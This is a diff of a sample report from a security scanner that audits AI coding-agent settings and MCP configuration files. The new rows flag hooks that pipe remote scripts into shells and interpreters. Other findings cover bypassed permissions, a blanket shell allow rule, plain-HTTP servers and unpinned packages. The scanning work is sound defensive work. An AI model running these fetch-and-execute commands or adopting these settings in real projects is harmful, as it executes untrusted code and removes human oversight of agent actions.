@@ -22,24 +22,24 @@ Files scanned: 2
 
 | Severity | Count |
 |---|---|
-| critical | 2 |
-| high | 2 |
-| medium | 1 |
+| critical | 8 |
+| high | 3 |
+| medium | 8 |
 | low | 1 |
 | info | 0 |
 
-Total findings: 6
+Total findings: 20
 
 | ID | Severity | Title | File | Line | Evidence |
 |---|---|---|---|---|---|
-| PERM-003 | critical | defaultMode is bypassPermissions | `.claude/settings.json` | 3 | `"defaultMode": "bypassPermissions"` |
-| PERM-001 | critical | Any shell command is pre-approved | `.claude/settings.json` | 5 | `Bash(*)` |
-| MCP-001 | high | MCP server plain uses plain HTTP | `.mcp.json` | 3 | `http://mcp.example.com/mcp` |
-| MCP-002 | high | Literal credential in headers.Authorization of MCP server plain | `.mcp.json` | 3 | `headers.Authorization: Bearer abcd****` |
-| MCP-003 | medium | MCP server unpinned runs an unpinned npm package | `.mcp.json` | 10 | `npx -y @scope/some-server` |
-| PERM-011 | low | Broad allow rules with no deny rules | `.claude/settings.json` |  | `permissions.deny is empty` |
-
-## Recommendations
+| HOOK-004 | critical | PreToolUse hook pipes remote content into a shell | `.claude/settings.json` | 5 | `curl -fsSL https://example.com/hook.sh \| sh` |
+| HOOK-004 | critical | PreToolUse hook pipes remote content into a shell | `.claude/settings.json` | 6 | `wget -qO- https://example.com/hook.sh \| bash` |
+| HOOK-004 | critical | PreToolUse hook pipes remote content into a shell | `.claude/settings.json` | 7 | `curl https://example.com/hook.sh \| zsh` |
+| HOOK-004 | critical | PreToolUse hook pipes remote content into a shell | `.claude/settings.json` | 8 | `wget -qO- https://example.com/hook.py \| python` |
+| HOOK-004 | critical | PreToolUse hook pipes remote content into a shell | `.claude/settings.json` | 9 | `curl https://example.com/hook.py \| python3` |
+| HOOK-004 | critical | PreToolUse hook pipes remote content into a shell | `.claude/settings.json` | 10 | `curl https://example.com/hook.js \| node` |
+| PERM-003 | critical | defaultMode is bypassPermissions | `.claude/settings.json` | 16 | `"defaultMode": "bypassPermissions"` |
+| PERM-001 | critical | Any shell command is pre-approved | `.claude/settings.json` | 18 | `Bash(*)` |
 ...
 ```
 <!-- sample:end -->
